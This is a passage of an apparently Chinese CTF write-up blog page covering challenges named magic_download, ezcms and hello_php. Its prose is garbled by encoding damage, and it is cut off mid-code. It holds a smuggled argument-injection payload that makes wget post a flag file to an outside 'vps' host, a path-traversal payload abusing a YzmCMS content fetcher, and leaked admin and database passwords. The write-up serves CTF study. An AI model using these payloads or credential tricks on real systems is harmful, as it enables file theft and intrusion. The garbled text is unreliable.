src="/2020/12/28/CTF_2020zongheng/image-20201228152015811.png"></p><p>BTWï¼Œæƒ³çŸ¥é“è¿™é¢˜çœŸæ­£åšçš„è¯æ€ä¹ˆå†™ï¼ˆ</p><h3 id="magic-download"><a href="#magic-download" class="headerlink" title="magic_download"></a>magic_download</h3><p><code>run.sh</code></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token builtin class-name">ulimit</span> -c <span class="token number">0</span>      <span class="token comment"># core dump size (kb)</span><span class="token builtin class-name">ulimit</span> -t <span class="token number">60</span>     <span class="token comment"># max cpu using (s/min)</span><span class="token builtin class-name">ulimit</span> -u <span class="token number">1500</span>    <span class="token comment"># max number of process</span><span class="token builtin class-name">ulimit</span> -m <span class="token number">512000</span> <span class="token comment"># max memory (kb)</span><span class="token builtin class-name">cd</span> /home/ctfstdbuf -oL <span class="token builtin class-name">echo</span> -n <span class="token string">"Please enter your IP:"</span><span class="token builtin class-name">read</span> IP<span class="token builtin class-name">echo</span> <span class="token variable">$IP</span><span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"^[0-9\.]\{7,15\}$"</span> <span class="token operator">&gt;</span> /dev/null<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$?</span> -ne <span class="token number">0</span> <span class="token punctuation">]</span><span class="token keyword">then</span>    stdbuf -oL <span class="token builtin class-name">echo</span> <span class="token string">"Please input a IP!"</span><span class="token keyword">else</span>    <span class="token builtin class-name">exec</span> /home/ctf/wget -P /tmp <span class="token variable">$IP</span><span class="token keyword">fi</span></code></pre><p>è¾“å…¥ä¸€ä¸ª IPï¼Œç„¶å grep åˆ¤æ–­æ˜¯å¦æ ¼å¼åˆç†ã€‚</p><p>å¤§å¸ˆå‚…æœ‰è¨€ï¼Œæ¢è¡Œ <code>\n</code> å†ç»“åˆ <code>echo</code> çš„ <code>-e</code> å‚æ•°å°±èƒ½ç»•è¿‡äº†ã€‚</p><p>è€Œä¸”è¿™ä¸ª <code>-e</code> å‚æ•°åœ¨ wget é‡Œä¹Ÿæ˜¯å­˜åœ¨çš„ã€‚</p><p><img src="/2020/12/28/CTF_2020zongheng/image-20201228212852852.png" alt="-e"></p><p><strong>Payload:</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">-e --post-flie<span class="token operator">=</span>/home/ctf/flag http://vps:port/ <span class="token punctuation">\</span><span class="token punctuation">\</span>n127.0.0.1</code></pre><p><code>echo</code> å‡ºæ¥ç»“æœå°±æ˜¯</p><pre class="language-none"><code class="language-none">--post-flie=/home/ctf/flag http://vps:port/ 127.0.0.1</code></pre><p>è€Œ grep å°±ä¼šåŒ¹é…åˆ°æœ€åä¸€è¡Œçš„ <code>127.0.0.1</code>ï¼Œäºæ˜¯å°±è®¤ä¸ºæ˜¯åˆç† IP äº†ã€‚</p><p><em>ï¼ˆå­¦åˆ°äº†å­¦åˆ°äº†</em></p><h3 id="é—®å·è°ƒæŸ¥"><a href="#é—®å·è°ƒæŸ¥" class="headerlink" title="é—®å·è°ƒæŸ¥"></a>é—®å·è°ƒæŸ¥</h3><p><code>flag{thanks_for_playing_our_games}</code></p><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h3><p><strong>YzmCMS</strong></p><p><code>www.zip</code> æºç æ³„éœ²</p><p><code>/www/common/config/config.php</code> é…ç½®æ–‡ä»¶</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//æ•°æ®åº“é…ç½®</span><span class="token string single-quoted-string">'db_type'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'pdo'</span><span class="token punctuation">,</span>         <span class="token comment">// æ•°æ®åº“é“¾æ¥æ‰©å±• , æ”¯æŒ pdo | mysqli | mysql</span><span class="token string single-quoted-string">'db_host'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span>       <span class="token comment">// æœåŠ¡å™¨åœ°å€</span><span class="token string single-quoted-string">'db_name'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">,</span>    <span class="token comment">// æ•°æ®åº“å</span><span class="token string single-quoted-string">'db_user'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">,</span>            <span class="token comment">// ç”¨æˆ·å</span><span class="token string single-quoted-string">'db_pwd'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'admin868'</span><span class="token punctuation">,</span>       <span class="token comment">// å¯†ç </span><span class="token string single-quoted-string">'db_port'</span> <span class="token operator">=&gt;</span> <span class="token number">3306</span><span class="token punctuation">,</span>              <span class="token comment">// ç«¯å£</span><span class="token string single-quoted-string">'db_prefix'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'yzm_'</span><span class="token punctuation">,</span>          <span class="token comment">// æ•°æ®åº“è¡¨å‰ç¼€</span></code></pre><p>/admin åå°å¼±å£ä»¤ç™»å½•ï¼Œç”¨æˆ·åå¯†ç åŒæ•°æ®åº“é…ç½®ã€‚</p><p>admin<br>admin868</p><p>å‚è€ƒ <a href="https://www.cnblogs.com/Spec/p/11188198.html">https://www.cnblogs.com/Spec/p/11188198.html</a></p><p><code>/www/yzmphp/core/class/collection.class.php</code></p><p><img src="/2020/12/28/CTF_2020zongheng/image-20201228171352186.png" alt="collection.class.php"></p><p>è¿™é‡Œç›¸å¯¹äºå®˜æ–¹æºç å»æ‰äº† curl æ‰§è¡Œï¼Œç›´æ¥ç”¨ <code>file_get_contents</code> æ¥æ‰§è¡Œäº†ã€‚</p><p>æ¨¡å—ç®¡ç†ä¸‹çš„ é‡‡é›†ç®¡ç†ï¼Œç½‘å€é…ç½®ä¸º vps ä¸Šä¸€ä¸ªé¡µé¢ï¼Œvps ä¸Šæ”¾ payloadã€‚</p><p><img src="/2020/12/28/CTF_2020zongheng/image-20201226193643241.png"></p><p>é¡µé¢ä¸Šæ”¾ä¸Šä¸€ä¸ª <code>a</code> æ ‡ç­¾ï¼Œæ„é€ ç›®å½•ç©¿è¶Šã€‚</p><p>å…ˆè¯•äº†è¯• <code>file</code> åè®®ï¼Œå‘ç°ä¼šæç¤º <code>é“¾æ¥åœ°å€ä»…å…è®¸HTTPå’ŒHTTPSåè®®ï¼</code></p><p><img src="/2020/12/28/CTF_2020zongheng/image-20201226194116722.png"></p><p>å†æŸ¥çœ‹æºç ã€‚</p><p> <code>url_check</code>å‡½æ•°</p><pre class="language-php" data-language="php"><code class="language-php">   <span class="token comment">/** * URLåœ°å€æ£€æŸ¥ * @param string $url      éœ€è¦æ£€æŸ¥çš„URL * @param string $baseurl  åŸºæœ¬URL * @return string */</span><span class="token keyword">protected</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">url_check</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token variable">$baseurl</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token variable">$urlinfo</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$baseurl</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'://'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$urlinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'://'</span><span class="token operator">.</span><span class="token variable">$urlinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$url</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token variable">$baseurl</span> <span class="token operator">=</span> <span class="token variable">$urlinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'://'</span><span class="token operator">.</span><span class="token variable">$urlinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$urlinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">?</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$urlinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token class-name return-type">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$urlinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$baseurl</span><span class="token operator">.</span><span class="token variable">$url</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'http'</span><span class="token punctuation">)</span> <span class="token function">showmsg</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'é“¾æ¥åœ°å€ä»…å…è®¸HTTPå’ŒHTTPSåè®®ï¼'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'stop'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$url</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>å¯è§åªè¦æ„é€ ä»¥ <code>http</code> å¼€å¤´çš„ url å³å¯ç»•è¿‡ checkã€‚</p><p><strong>Payload:</strong></p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>httpss://miaotony.xyz/../../../../../../../../flag<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>meow<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>test</span><span class="token punctuation">&gt;</span></span></code></pre><p>æµ‹è¯•é‡‡é›†ï¼Œå¾—åˆ° flag</p><p><img src="/2020/12/28/CTF_2020zongheng/image-20201226164308132.png"></p><p><code>flag{de3974b7-9c59-4317-b7ab-479b4e058683}</code></p><h3 id="hello-php"><a href="#hello-php" class="headerlink" title="hello_php"></a>hello_php</h3><blockquote><p>XXXCMSæ˜¯ä¸€ç§å¯ä»¥ç»¼åˆç®¡ç†ç½‘ç«™ä¸Šå„ç§æ ç›®çš„é€šç”¨å·¥å…·ï¼Œæ–°é—»ã€äº§å“ã€æ–‡æ¡£ã€ä¸‹è½½ã€éŸ³ä¹ã€æ•™å­¦è§†é¢‘â€¦â€¦ï¼Œé€šè¿‡æ¨¡ç‰ˆæŠ€æœ¯ï¼Œä»–ä»¬éƒ½åœ¨åŒä¸€å¥—ç³»ç»Ÿé‡Œå®Œæˆæ›´æ–°å’Œç»´æŠ¤ã€‚XXXCMS æ˜¯ç›®å‰å›½å†…æœ€å¼ºå¤§ã€æœ€ç¨³å®šçš„ä¸­å°å‹é—¨æˆ·ç½‘ç«™å»ºè®¾è§£å†³æ–¹æ¡ˆä¹‹ä¸€ï¼ŒåŸºäºPHPã€ MySQLçš„æŠ€æœ¯å¼€å‘ï¼Œå…¨éƒ¨æºç å¼€æ”¾ã€‚</p></blockquote><p><code>www.zip</code> æºç æ³„éœ²</p><p><code>config.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$title</span><span class="token operator">=</span><span class="token string single-quoted-string">'XXXä¿¡æ¯ç®¡ç†ç³»ç»Ÿ'</span><span class="token punctuation">;</span>    <span class="token variable">$commnet</span><span class="token operator">=</span><span class="token string single-quoted-string">'XXXCMSæ˜¯ä¸€ç§å¯ä»¥ç»¼åˆç®¡ç†ç½‘ç«™ä¸Šå„ç§æ ç›®çš„é€šç”¨å·¥å…·ï¼Œæ–°é—»ã€äº§å“ã€æ–‡æ¡£ã€ä¸‹è½½ã€éŸ³ä¹ã€æ•™å­¦è§†é¢‘â€¦â€¦ï¼Œé€šè¿‡æ¨¡ç‰ˆæŠ€æœ¯ï¼Œä»–ä»¬éƒ½åœ¨åŒä¸€å¥—ç³»ç»Ÿé‡Œå®Œæˆæ›´æ–°å’Œç»´æŠ¤ã€‚XXXCMS æ˜¯ç›®å‰å›½å†…æœ€å¼ºå¤§ã€æœ€ç¨³å®šçš„ä¸­å°å‹é—¨æˆ·ç½‘ç«™å»ºè®¾è§£å†³æ–¹æ¡ˆä¹‹ä¸€ï¼ŒåŸºäº PHP   MySQL çš„æŠ€æœ¯å¼€å‘ï¼Œå…¨éƒ¨æºç å¼€æ”¾ã€‚'</span><span class="token punctuation">;</span>    <span class="token variable">$logo_url</span><span class="token operator">=</span><span class="token string single-quoted-string">'./static/default.jpg'</span><span class="token punctuation">;</span>    <span class="token variable">$admin_user</span><span class="token operator">=</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span>    <span class="token variable">$admin_pass</span><span class="token operator">=</span><span class="token string single-quoted-string">'admin888'</span><span class="token punctuation">;</span>    <span class="token variable">$footer</span><span class="token operator">=</span><span class="token string heredoc-string"><span class="token delimiter symbol"><span class="token punctuation">&lt;&lt;&lt;</span>EOD</span>    &lt;script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" &gt;&lt;/script&gt;    &lt;script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"&gt;&lt;/script&gt;    &lt;/body&gt;    &lt;/html&gt;<span class="token delimiter symbol">EOD<span class="token punctuation">;</span></span></span></span></code></pre><p>ä»ä¸­å¾—çŸ¥ç”¨æˆ·åå¯†ç ä¸º</p><p>admin<br>admin888</p><p>åœ¨ <code>login.php</code> ç™»å½•ï¼Œç„¶åè®¿é—® <code>admin.php</code>ï¼Œæºç å¦‚ä¸‹ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant boolean">True</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script&gt;alert('è¯·ç™»å½•');history.go(-1);&lt;/script&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'update'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">include_once</span> <span class="token string single-quoted-string">'header.php'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar navbar-light bg-light<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-primary<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">data-toggle</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>collapse<span class="token punctuation">"</span></span> <span class="token attr-name">data-target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#upload<span class="token punctuation">"</span></span> <span class="token attr-name">aria-expanded</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span> <span class="token attr-name">aria-controls</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    ä¸Šä¼ ç½‘ç«™å›¾æ ‡  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-primary<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">data-toggle</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>collapse<span class="token punctuation">"</span></span> <span class="token attr-name">data-target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#update<span class="token punctuation">"</span></span> <span class="token attr-name">aria-expanded</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span> <span class="token attr-name">aria-controls</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>update<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    ä¿®æ”¹ç½‘ç«™æ ‡é¢˜  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-primary<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">data-toggle</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>collapse<span class="token punctuation">"</span></span> <span class="token attr-name">data-target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#reset<span class="token punctuation">"</span></span> <span class="token attr-name">aria-expanded</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span> <span class="token attr-name">aria-controls</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>reset<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    æ¢å¤å‡ºå‚è®¾ç½®  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card card-body<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>admin.php?upload<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>multipart/form-data<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>file<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>abs<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-primary<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>ä¸Šä¼ <span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>update<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card card-body<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  åƒåœ¾è€æ¿å°±ç»™æˆ‘è¿™ä¹ˆç‚¹é’±ï¼Œå«æˆ‘æ€ä¹ˆå¸®ä½ åšäº‹ã€‚    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>admin.php?update<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lalal<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>è¯·è¾“å…¥ç½‘ç«™æ ‡é¢˜<span class="token punctuation">'</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>form-control<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>btn btn-primary<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>collapse<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>reset<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card card-body<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    åˆ åº“è·‘è·¯çš„è‰ºæœ¯å°±æ˜¯æƒ³åˆ å°±åˆ ï¼Œæƒ³æ¢å¤å°±æ¢å¤ã€‚    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>resetbtn<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-primary<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>ç‚¹æˆ‘é‡ç½®<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#resetbtn"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'./reset.php'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>location<span class="token punctuation">.</span><span class="token function">reload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token 